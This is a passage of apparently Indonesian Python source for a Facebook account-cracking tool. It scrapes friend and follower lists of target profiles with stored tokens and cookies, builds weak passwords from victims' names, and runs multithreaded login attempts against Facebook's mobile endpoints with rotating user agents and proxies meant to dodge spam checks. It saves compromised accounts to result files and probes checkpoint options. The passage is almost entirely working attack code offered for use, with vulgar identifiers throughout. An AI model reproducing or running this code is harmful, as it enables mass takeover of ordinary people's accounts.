		buka_baju = open(files, "r").readlines()
	except IOError:
		exit("\n%s files %s%s%s tidak ada!"%(garis,H,files,P))
	for memek in buka_baju:
		kontol = memek.replace("\n","")
		titid  = kontol.split("|")
		print(f"\n{garis} account : "+(kontol.replace(" + ","")))
		try:
			HikmatXF(titid[0].replace(" + ",""), titid[1])
		except requests.exceptions.ConnectionError:
			pass
	#os.remove(f"CP/{cpz}")
	input(f" enter untuk kembali ")
	menu()
	#exit("\n%s done ya cuy"%(garis))

def HikmatXF(user, pasw):
	mb = ("https://mbasic.facebook.com")
	ua_crack = ["Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.69 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Focus/1.0 Chrome/59.0.3029.83 Mobile Safari/537.36","Mozilla/5.0 (X11; Linux armv6l) EkiohFlow/5.13.4.34727M Flow/5.13.4 (like Gecko Firefox/62.0 rv:62.0)","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Safari/537.36","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Silk/102.2.1 like Chrome/102.0.5005.125 Safari/537.36","Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.101 Safari/537.36 OPR/40.0.2308.62","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Safari/537.36","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.79 Safari/537.36 PTST/220727.141334","Mozilla/5.0 (X11; U; Linux i686; en-GB; rv:1.8.0.8) Gecko/20061025 Firefox/1.5.0.8","Links (2.20.2; Linux 5.4.0-100-generic x86_64; GNU C 9.2.1; text)","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/68.0.2785.34 Safari/537.31 SmartTV/8.5","Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/19.0 Chrome/102.0.5005.125 Safari/537.36","Mozilla/5.0 (Linux; x86_64 GNU/Linux) AppleWebKit/601.1 (KHTML, like Gecko) Version/8.0 Safari/601.1 WPE comcast/ipstb (comcast, 1.0.0.0)","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/68.0.2785.34 Safari/537.31 SmartTV/8.5","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.3945.79 Safari/537.36 SmartTV/10.0 Colt/2.022","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.3945.79 Safari/537.36 SmartTV/10.0 Colt/2.0","Mozilla/5.0 (Linux; NetCast; U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3440.106 Safari/537.36 SmartTV/9.0 Crow/1.0"]
	ua = random.choice(ua_crack)
	ses = requests.Session()
	ses.headers.update({
	"Host": "mbasic.facebook.com",
	"cache-control": "max-age=0",
	"upgrade-insecure-requests": "1",
	"origin": host,
	"content-type": "application/x-www-form-urlencoded",
	"user-agent": ua,
	"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
	"x-requested-with": "mark.via.gp",
	"sec-fetch-site": "same-origin",
	"sec-fetch-mode": "navigate",
	"sec-fetch-user": "?1",
	"sec-fetch-dest": "document",
	"referer": host+"/login/?next&ref=dbl&fl&refid=8",
	"accept-encoding": "gzip, deflate",
	"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
	})
	data = {}
	ged = sop(ses.get(host+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
	fm = ged.find("form",{"method":"post"})
	list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
	for i in fm.find_all("input"):
		if i.get("name") in list:
			data.update({i.get("name"):i.get("value")})
		else:
			continue
	data.update({"email":user,"pass":pasw})
	try:
		run = sop(ses.post(host+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
	except requests.exceptions.TooManyRedirects:
		print("%s %sakun ke spam "%(garis,M))
	if "c_user" in ses.cookies:
		print("%s %sakun OK tidak checkpoint"%(garis,H))
	elif "checkpoint" in ses.cookies:
		form = run.find("form")
		dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
		jzst = form.find("input",{"name":"jazoest"})["value"]
		nh   = form.find("input",{"name":"nh"})["value"]
		dataD = {
			"fb_dtsg": dtsg,
			"fb_dtsg": dtsg,
			"jazoest": jzst,
			"jazoest": jzst,
			"checkpoint_data":"",
			"submit[Continue]":"Lanjutkan",
			"nh": nh
		}
		xnxx = sop(ses.post(host+form["action"], data=dataD).text, "html.parser")
		ngew = [yy.text for yy in xnxx.find_all("option")]
		if(str(len(ngew))=="0"):
			print("%s %sakun tapyes or a2f yang sudah di crack orang.. segera check di fb lite/mbasic"%(garis,H))
		else:
			print("%s %sterdapat %s opsi "%(garis,K,str(len(ngew))))
		for opt in range(len(ngew)):
			print(" "*3, str(opt+1)+". "+ngew[opt])
	elif "login_error" in str(run):
		oh = run.find("div",{"id":"login_error"}).find("div").text
		print(" %s[%s!%s] %s%s"%(M,P,M,P,oh))
	else:
		print("%s %spassword akun telah diganti!!"%(garis,M))

def cracked_email():
	x = 0
	print("")
	n=f"{P2}[01] domain @gmail.com\n{P2}[02] domain @yahoo.com\n{P2}[03] domain @hotmail.com\n{P2}[04] domain @outlook.com"
	vprint(panel(n,style=f"{warna_warni_rich_cerah}"))
	sae = input(f"{garis} pilih : {H}")
	if sae in["1"]:
		email = "@gmail.com"
		nama = input(f"{garis} input nama : ")
		jumlah = int(input(f"{garis} input limit : "))
		for z in range(jumlah):
			x +=1
			id.append(email+"<=>"+nama)
			sys.stdout.write(f"\r{garis} sedang mengumpulkan id {len(id)} ");sys.stdout.flush()
	elif sae in["2"]:
		email = "@yahoo.com"
		nama = input(f"{garis} input nama : ")
		jumlah = int(input(f"{garis} input limit : "))
		for z in range(jumlah):
			x +=1
			id.append(email+"<=>"+nama)
			sys.stdout.write(f"\r{garis} sedang mengumpulkan id {len(id)} ");sys.stdout.flush()
	elif sae in["3"]:
		email = "@hotmail.com"
		nama = input(f"{garis} input nama : ")
		jumlah = int(input(f"{garis} input limit : "))
		for z in range(jumlah):
			x +=1
			id.append(email+"<=>"+nama)
			sys.stdout.write(f"\r{garis} sedang mengumpulkan id {len(id)} ");sys.stdout.flush()
	elif sae in["4"]:
		email = "@outlook.com"
		nama = input(f"{garis} input nama : ")
		jumlah = int(input(f"{garis} input limit : "))
		for z in range(jumlah):
			x +=1
			id.append(email+"<=>"+nama)
			sys.stdout.write(f"\r{garis} sedang mengumpulkan id {len(id)} ");sys.stdout.flush()
	settingers()

def massal_cracked_public():
	print("")
	x=f"\t\t{P2}target harus public & banyak friends nya"
	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
	try:
		jum = int(input(garis+" mau berapa id :"+H+" "))
	except ValueError:
		jalan(garis+" yang kamu ketik itu bukan nomor")
		menu()
	if jum<1 or jum>20:
		jalan(garis+" kesalahan yang tidak terduga")
		menu()
	ses=requests.Session()
	yz = 0
	x=f"\t\t{P2}ketik {H2}me{P2} untuk crack dari pertemanan"
	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
	for met in range(jum):
		yz+=1
		kl = input(garis+" masukan id ke "+H+str(yz)+P+" :"+H+" ")
		#token = open('token.txt','r').read()
		#cookie = open('cookie.txt','r').read()
		#coki = {"cookie":cookie}
		#$coa = requests.get('https://graph.facebook.com/%s?access_token=%s'%(kl,token),cookies=coki)
		#el = json.loads(coa.text)
		#try:lk = el["name"]
		#except (KeyError,IOError):
			#lk = M+"-"+P
		#ooi = requests.get('https://graph.facebook.com/%s?access_token=%s'%(kl,token),cookies=coki)
		#oer = json.loads(ooi.text)
		#try:pok = oer["locale"]
		#except (KeyError,IOError):
			#pok = M+"-"+P
		#id8 = []
		#id9 = []
		#token = open('token.txt','r').read()
		#cookie = open('cookie.txt','r').read()
		#coki = {"cookie":cookie}
		#cyna = requests.get('https://graph.facebook.com/%s?fields=friends.limit(99999)&access_token=%s'%(kl,token),cookies=coki).json()
		#for fuck in cyna['friends']['data']:
			#try:id8.append(fuck['id']+'|'+fuck['name'])
			#except:pass
		#token = open('token.txt','r').read()
		#cookie = open('cookie.txt','r').read()
		#coki = {"cookie":cookie}
		#cyna = requests.get('https://graph.facebook.com/%s?fields=subscribers.limit(5000)&access_token=%s'%(kl,token),cookies=coki).json()
		#for fuck in cyna['subscribers']['data']:
			#try:id9.append(fuck['id']+'|'+fuck['name'])
			#except:pass
		#x=f"{P2}nama target : {H2}{lk}\n{P2}friends total : {H2}{len(id8)}\n{P2}lokasi target akun : {H2}{pok}"
		#vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
		uid.append(kl)
		#idez.append(kl)
	for userr in uid:
		try:
			#token = open('token.txt','r').read()
			#cookie = open('cookie.txt','r').read()
			#coki = {"cookie":cookie}
			#cyna = requests.get('https://graph.facebook.com/%s?fields=subscribers.limit(99999)&access_token=%s'%(idez,token),cookies=coki).json()
			#for fuck in cyna['subscribers']['data']:
				#try:id3.append(fuck['id']+'|'+fuck['name'])
				#except:pass
			#coa = requests.get('https://graph.facebook.com/%s?access_token=%s'%(userr,token),cookies=coki)
			#el = json.loads(coa.text)
			#try:lk = el["name"]
			#except (KeyError,IOError):
				#lk = M+"-"+P
			token = open('token.txt','r').read()
			cookie = open('cookie.txt','r').read()
			coki = {"cookie":cookie}
			cyna = requests.get('https://graph.facebook.com/%s?fields=friends.limit(99999)&access_token=%s'%(userr,token),cookies=coki).json()
			for fuck in cyna['friends']['data']:
				try:id.append(fuck['id']+'|'+fuck['name'])
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			jalan(garis+" koneksi internet bermasalah ")
			exit()
	if len(id)==0:
		x=f"{P2}total friends : {M2}{len(id)}"
		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
	else:
		x=f"{P2}total friends : {H2}{len(id)}"
		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
	settingers()

def cracked_public():
	x=f"\t\t{P2}ketik {H2}me{P2} untuk crack dari pertemanan"
	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
	put = input(garis+" target id public :"+H+" ")
	try:
		token = open('token.txt','r').read()
		cookie = open('cookie.txt','r').read()
		coki = {"cookie":cookie}
		coa = requests.get('https://graph.facebook.com/%s?access_token=%s'%(put,token),cookies=coki)
		el = json.loads(coa.text)
		try:lk = el["name"]
		except (KeyError,IOError):
			lk = M+"-"+P
		#nama = requests.get('https://graph.facebook.com/%s?access_token=%s'%(put,token),cookies=coki).json()
		#print(f"{garis} Mengambil ID Teman"+H+": "+nama["name"])
		#link = requests.get('https://graph.facebook.com/%s/fields=friends?fields=name,id,birthday&limit=1000&access_token=%s'%(put,token),cookies=coki)
		#link_ = requests.get('https://graph.facebook.com/%s?fields=friends.limit(99999)&access_token=%s'%(put,token),cookies=coki).json()
		#try:
			#Hikmat = link["data"]
			#ttl__ = []
			#ttl__.append("\033[96;1m + TTL")
		#except:
			#pass
		#if len(link["data"]) == 0:
			#print(M+"\n [x] Tidak Bisa Mengakses Data: "+K+nama["name"])
			#print(M+" [x] Coba cari Akun yg lainnya!")
			#exit()
		#global ttl__
		token = open('token.txt','r').read()
		cookie = open('cookie.txt','r').read()
		coki = {"cookie":cookie}
		cyna = requests.get('https://graph.facebook.com/%s?fields=friends.limit(99999)&access_token=%s'%(put,token),cookies=coki).json()
		for fuck in cyna['friends']['data']:
			try:id.append(fuck['id']+'|'+fuck['name'])
			except:continue
		cini = requests.get('https://graph.facebook.com/%s?fields=subscribers.limit(10000)&access_token=%s'%(put,token),cookies=coki).json()
		for fak in cini['subscribers']['data']:
			try:id3.append(fak['id']+'|'+fak['name'])
			except:continue
		#print(maling_pangsit+" nama target :%s %s"(H,lk))
		x=f"\t  {P2}total friends : {H2}{len(id)}  &  {P2}total followers : {H2}{len(id3)}"
		vprint(panel(x,title=f"{H2}• {P2}{lk} {H2}•"))
		settingers()
	except requests.exceptions.ConnectionError:
		jalan(garis+" koneksi internet bermasalah ")
		exit()
	except (KeyError,IOError):
		jalan(garis+" gagal dump id... mungkin privat friends/gada friends nya") 
		exit()
	
def settingers():
	print("""\x1b[0;94m╭─────── • \x1b[0;97mfriend crack \x1b[0;94m• ────────╮╭────── • \x1b[0;97mfollower crack \x1b[0;94m• ───────╮
│\x1b[0;97m[\x1b[0;92m01\x1b[0;97m] uid new akun ( recommended )││\x1b[0;97m[\x1b[0;92m04\x1b[0;97m] uid new akun ( recommended )│
│\x1b[0;97m[\x1b[0;92m02\x1b[0;97m] uid old akun ( up to you > )││\x1b[0;97m[\x1b[0;92m05\x1b[0;97m] uid old akun ( up to you > )│
│\x1b[0;97m[\x1b[0;92m03\x1b[0;97m] uid random > ( highly use+ )││\x1b[0;97m[\x1b[0;92m06\x1b[0;97m] uid random > ( highly use+ )│
\x1b[0;94m╰─────────────────────────────────╯╰─────────────────────────────────╯""")
	GlukTzy = input(garis+" pilih : "+H)
	if GlukTzy in ['2','02']:
		for bacot in id:
			id2.append(bacot)
	elif GlukTzy in ['1','01']:
		for bacot in id:
			id2.insert(0,bacot)
	elif GlukTzy in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	elif GlukTzy in ['5','05']:
		for kont in id3:
			id4.append(kont)
	elif GlukTzy in ['4','04']:
		for kont in id3:
			id4.insert(0,kont)
	elif GlukTzy in ['6','06']:
		for kont in id3:
			xx = random.randint(0,len(id4))
			id4.insert(xx,kont)
	else:
		jalan(garis+" isi yang benar")
		settingers()
	crack_public_pilihan()

def crack_public_pilihan():
	print("""\x1b[0;94m╭───────── • \x1b[0;97mhalal on \x1b[0;94m• ──────────╮╭───────── • \x1b[0;97mharam of \x1b[0;94m• ──────────╮
│\x1b[0;97m[\x1b[0;92m01\x1b[0;97m] very slowed crack  ( \x1b[0;93m40% \x1b[0;97m)  ││\x1b[0;97m[\x1b[0;92m04\x1b[0;97m] very slowed crack  ( \x1b[0;92m50% \x1b[0;97m)  │
│\x1b[0;97m[\x1b[0;92m02\x1b[0;97m] faster crack  >_^  ( \x1b[0;91m10% \x1b[0;97m)  ││\x1b[0;97m[\x1b[0;92m05\x1b[0;97m] very faster crack  ( \x1b[0;91m20% \x1b[0;97m)  │
│\x1b[0;97m[\x1b[0;92m03\x1b[0;97m] slowed crack  >_^  ( \x1b[0;92m50% \x1b[0;97m)  ││\x1b[0;97m[\x1b[0;92m06\x1b[0;97m] slowed crack  >_^  ( \x1b[0;93m40% \x1b[0;97m)  │
\x1b[0;94m╰─────────────────────────────────╯╰─────────────────────────────────╯""")
	met = input(garis+" pilih : "+H)
	if met in ["1","01","a"]:
		metode.append("mobile")
	elif met in ["2","02","b"]:
		metode.append("mbasic")
	elif met in ["3","03","c"]:
		metode.append("free")
	elif met in ["4","04"]:
		metode.append("mobile_v2")
	elif met in ["5","05"]:
		metode.append("bapi")
	elif met in ["6","06"]:
		metode.append("mobile_freefire")
	else:
		metode.append("mobile")
	print(f"""{B}╭────────────────────────────────╮
{P}│  list crack password tambahan  │
{B}╰────────────────────────────────╯""")
	pw_tambahani = input(garis+" pilih ("+H+"y"+P+" or "+M+"t"+P+") :"+H+" ")
	if pw_tambahani in ["y","Y","yes","Ya","Yes"]:
		pw_tambahan.append("ya")
		x=f"{P2}contoh password tambahan : {H2}anjing,ngentot,sayang "
		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
		pw_nya_cok = input(garis+" password tambahan :"+H+" ")
		pw_gw=pw_nya_cok.split(',')
		for cpw in pw_gw:
			pw_ni.append(cpw)
	elif pw_tambahani in ["t","T","Tidak","tidak","no"]:
		pw_tambahan.append("no")
	else:
		pw_tambahan.append("no")
	print(f"""{B}╭────────────────────────────────╮
{P}│ menambah proxy agar tidak spam │
{B}╰────────────────────────────────╯""")
	nanya_proxy = input(garis+" pilih ("+H+"y"+P+" or "+M+"t"+P+") :"+H+" ")
	if nanya_proxy in ["y","Y","yes","Ya"]:
		proxp()
	elif nanya_proxy in ["t","T","tidak","Tidak"]:
		proxp()
	else:
		proxp()
	print(f"""{B}╭────────────────────────────────╮
{P}│ user agent tambahan untk crack │
{B}╰────────────────────────────────╯""")
	uar = input(f"{garis} pilih ({H}y{P} or {M}t{P}) : {H}")
	if uar in ["y","Y","ya"]:
		ua = input(f"{garis} masukan ua : {H}")
		ugent = ua.split(',')
		ugent = open('useragent.txt','w')
		ugent.write(ua)
		ugent.close()
	elif uar in ["t","T","tidak"]:
		pass
	else:
		jalan(f"{garis} isi yang benar ")
		crack_public_pilihan()
	#tamtttl = input(garis+" ingin memunculkan ttl akun cp/ok ("+H+"y"+P+"/"+M+"t"+P+") ? :"+H+" ")
	#if tamtttl in ["y","Y","ya"]:
		#tampilkan_ttl.append("ya")
	#elif tamtttl in ["t","T","tidak"]:
		#tampilkan_ttl.append("no")
	#else:
		#tampilkan_ttl.append("no")
	#nanya_opsi = input(garis+" ingin memunculkan opsi detect ("+H+"y"+P+"/"+M+"t"+P+") ? :"+H+" ")
	#if nanya_opsi in ["y","ya","Y"]:
		#tampilkan_opsi.append("ya")
	#elif nanya_opsi in ["t","T","tidak"]:
		#tampilkan_opsi.append("no")
	#else:
		#tampilkan_opsi.append("no")
	print(f"""{B}╭────────────────────────────────╮
{P}│tampilkan aplikasi terkait akunn│
{B}╰────────────────────────────────╯""")
	nanya_apk = input(garis+" pilih ("+H+"y"+P+" or "+M+"t"+P+") :"+H+" ")
	if nanya_apk in ["y","ya","Y"]:
		tampilkan_apk.append("ya")
	elif nanya_apk in ["t","T","tidak"]:
		tampilkan_apk.append("no")
	else:
		tampilkan_apk.append("no")
	print(f"""{B}╭────────────────────────────────╮
{P}│  list passwords belakang nama  │
{B}╰────────────────────────────────╯""")
	pw_tambahai = input(garis+" pilih ("+H+"y"+P+"/"+M+"t"+P+") :"+H+" ")
	if pw_tambahai in ["y","Y","yes","Ya","Yes"]:
		pw_belakang.append("ya")
		x=f"{P2}contoh password belakang : {H2}anjing,ngentot,sayang "
		vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
		pw_nya_cok = input(garis+" password belakang nama :"+H+" ")
		pw_gw=pw_nya_cok.split(',')
		for cpw in pw_gw:
			pw_lu.append(cpw)
	elif pw_tambahai in ["t","T","Tidak","tidak","no"]:
		pw_belakang.append("no")
	else:
		pw_belakang.append("no")
	print(f"""{B}╭────────────────────────────────╮
{P}│  menggunakan passwords manual  │
{B}╰────────────────────────────────╯""")
	pilpas = input(garis+" pilih ("+H+"y"+P+" or "+M+"t"+P+") :"+H+" ")
	if pilpas in ["y","Y","ya","yes"]:
		with tread(max_workers=30) as HikmatXF:
			x=f"{P2}contoh password : {H2}anjing,ngentot,sayang "
			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			listpass = input(garis+"%s list password :%s "%(P,H))
			if len(listpass)<=5:
				exit("\n"+garis+"%s password minimal 6 angka"%(M))
			x=f"{P2}list password crack {H2}{listpass}"
			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			print("")
			x=f"{P2}hasil crack ok tersimpan di {H2}OK/{sekarang}.txt\n{P2}hasil crack cp tersimpan di {K2}CP/{sekarang}.txt\n{P2}kalo tidak ada hasil coba mode pesawat 5 detik trus hidupin lagi data nya\nmoga dapet banyak yakk result nya "
			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			print("")
			for user in id:
				HikmatXF.submit(mobile, user, listpass.split(","))
		print("")
		if len(ok) != 0 or len(cp) != 0:
			x=f"{P2}hasil cp mu : {K2}{len(cp)}\n{P2}hasil ok mu : {H2}{len(ok)}"
			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			input(garis+" kembali ")
			menu()
		else:
			x=f"{P2}kok gada hasil? makanya ganteng klo gk ganteng kemungkinan kecil dapet result, intinya harus ganteng ajg:v"
			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			input(garis+" kembali ")
			menu()
	elif pilpas in ["t","T","tidak","Tidak"]:
		passwer()

def passwer():
	global prog,des
	x=f"  {P2}selamat mencoba semoga menemukan harta karun anda kaito change "
	vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
	prog = Progress(SpinnerColumn('bouncingBall'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id))
	with prog:
		with tread(max_workers=30) as HikmatXD:
			for koncol in id2 or id4:
				uiz,mmk = koncol.split('|')[0],koncol.split('|')[1].lower()
				prot = mmk.split(' ')[0]
				pwr = []
				if len(mmk)<6:
					if len(prot)<3:
						pass
					else:
						pwr.append(prot+'123')
						pwr.append(prot+'12345')
						pwr.append(prot+'1234')
				else:
					if len(prot)<3:
						pwr.append(mmk)
					else:
						pwr.append(mmk)
						pwr.append(prot+'123')
						pwr.append(prot+'12345')
						pwr.append(prot+'1234')
				if 'ya' in pw_tambahan:
					for xnxr in pw_ni:
						pwr.append(xnxr)
				if 'ya' in pw_belakang:
					for asoe in pw_lu:
						pwr.append(prot+asoe)
				else:pass
				if 'mobile' in metode:
					HikmatXD.submit(mobile,uiz,pwr,"m.facebook.com")
				elif 'mbasic' in metode:
					HikmatXD.submit(mbasic,uiz,pwr,"mbasic.facebook.com")
				elif 'free' in metode:
					HikmatXD.submit(free,uiz,pwr,"free.facebook.com")
				elif "mobile_v2" in metode:
					HikmatXD.submit(mobile_v2,uiz,pwr,"m.facebook.com")
				elif "bapi" in metode:
					HikmatXD.submit(api,uiz,pwr)
				elif "mobile_freefire" in metode:
					HikmatXD.submit(mobile_free_fire,uiz,pwr,"m.facebook.com")
				else:
					HikmatXD.submit(mobile,uiz,pwr,"m.facebook.com")
		print("")
		if ok != 0 or cp != 0:
			x=f"{P2}hasil cp mu : {K2}{cp}\n{P2}hasil ok mu : {H2}{ok}"
			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			input(garis+" kembali ")
			tanya_hal = input(f"{garis} ingin memakai check opsi detector untuk hasil crack cp ({H}y{P}/{M}t{P}) ? : {H}")
			if tanya_hal in ["y","Y","ya"]:
				check_opsi_sesudah_crack()
			elif tanya_hal in ["t","T","tidak"]:
				menu()
			else:
				menu()
		else:
			x=f"{P2}kok gada hasil? makanya ganteng klo gk ganteng kemungkinan kecil dapet result, intinya harus ganteng ajg:v"
			vprint(panel(x,style=f"{warna_warni_rich_cerah}"))
			input(garis+" kembali ")
			menu()
		
def mobile(uiz,pwr,link_okep):
	global ok,cp,HikmatXD
#	sisa = ["Mozilla/5.0 (Linux; U; Android 4.2; en-us; SonyC6903 Build/14.1.G.1.518) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30","Mozilla/5.0 (Linux; U; Android 2.3.4; en-us; Kindle Fire Build/GINGERBREAD) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1","Mozilla/5.0 (Linux; U; en-us; KFTHWI Build/JDQ39) AppleWebKit/535.19 (KHTML, like Gecko) Silk/3.13 Safari/535.19 Silk-Accelerated=true","Mozilla/5.0 (Linux; U; en-us; KFAPWI Build/JDQ39) AppleWebKit/535.19 (KHTML, like Gecko) Silk/3.13 Safari/535.19 Silk-Accelerated=true","Mozilla/5.0 (compatible; MSIE 10.0; Windows Phone 8.0; Trident/6.0; IEMobile/10.0; ARM; Touch; NOKIA; Lumia 820)","Mozilla/5.0 (BB10; Touch) AppleWebKit/537.10+ (KHTML, like Gecko) Version/10.0.9.2372 Mobile Safari/537.10+","Mozilla/5.0 (BB10; Touch) AppleWebKit/537.10+ (KHTML, like Gecko) Version/10.0.9.2372 Mobile Safari/537.10+","Mozilla/5.0 (PlayBook; U; RIM Tablet OS 2.1.0; en-US) AppleWebKit/536.2+ (KHTML like Gecko) Version/7.2.1.0 Safari/536.2+"]
#	ua_crack = ["Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_2 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8H7 Safari/6533.18.5","Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X; en-us) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53","Mozilla/5.0 (iPhone; CPU iPhone OS 8_0 like Mac OS X) AppleWebKit/600.1.3 (KHTML, like Gecko) Version/8.0 Mobile/12A4345d Safari/600.1.4","Mozilla/5.0 (iPhone; CPU iPhone OS 8_0 like Mac OS X) AppleWebKit/600.1.3 (KHTML, like Gecko) Version/8.0 Mobile/12A4345d Safari/600.1.4","Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_2 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8H7 Safari/6533.18.5","Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X; en-us) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53","Mozilla/5.0 (iPad; CPU OS 4_3_5 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8L1 Safari/6533.18.5","Mozilla/5.0 (iPad; CPU OS 5_1 like Mac OS X; en-us) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B176 Safari/7534.48.3","Mozilla/5.0 (iPad; CPU OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53","Mozilla/5.0 (iPad; CPU OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53","Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A406 Safari/8536.25","Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 4 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.166 Mobile Safari/535.19","Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.166 Mobile Safari/535.19","Mozilla/5.0 (Linux; Android 4.3; Nexus 10 Build/JSS15Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.72 Safari/537.36","Mozilla/5.0 (Linux; Android 4.3; Nexus 7 Build/JSS15Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.72 Safari/537.36"]
#	new = ["Mozilla/5.0 (Linux; Android 4.3; Nexus 7 Build/JSS15Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.72 Safari/537.36","Mozilla/5.0 (Linux; U; Android 2.3; en-us; SAMSUNG-SGH-I717 Build/GINGERBREAD) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1","Mozilla/5.0 (Linux; U; Android 4.1; en-us; GT-N7100 Build/JRO03C) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30","Mozilla/5.0 (Linux; U; Android 4.3; en-us; SM-N900T Build/JSS15J) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30","Mozilla/5.0 (Linux; U; Android 2.1; en-us; GT-I9000 Build/ECLAIR) AppleWebKit/525.10+ (KHTML, like Gecko) Version/3.0.4 Mobile Safari/523.12.2","Mozilla/5.0 (Linux; U; Android 4.0; en-us; GT-I9300 Build/IMM76D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30","Mozilla/5.0 (Linux; Android 4.2.2; GT-I9505 Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.59 Mobile Safari/537.36","Mozilla/5.0 (Linux; U; Android 2.2; en-us; SCH-I800 Build/FROYO) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1","Mozilla/5.0 (Linux; U; Android 2.2; en-us; SCH-I800 Build/FROYO) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1","Mozilla/5.0 (Linux; U; Android 2.2; en-us; Sprint APA9292KT Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1","Mozilla/5.0 (Linux; Android 4.0.3; HTC One X Build/IML74K) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.133 Mobile Safari/535.19","Mozilla/5.0 (Linux; U; Android 4.0.3; en-us; HTC Sensation Build/IML74K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30","Mozilla/5.0 (Linux; U; Android 2.0; en-us; Milestone Build/ SHOLS_U2_01.03.1) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Mobile Safari/530.17","Mozilla/5.0 (Linux; U; Android 2.2; en-us; Droid Build/FRG22D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1","Mozilla/5.0 (Linux; U; Android 3.0; en-us; Xoom Build/HRI39) AppleWebKit/525.10 (KHTML, like Gecko) Version/3.0.4 Mobile Safari/523.12.2"]
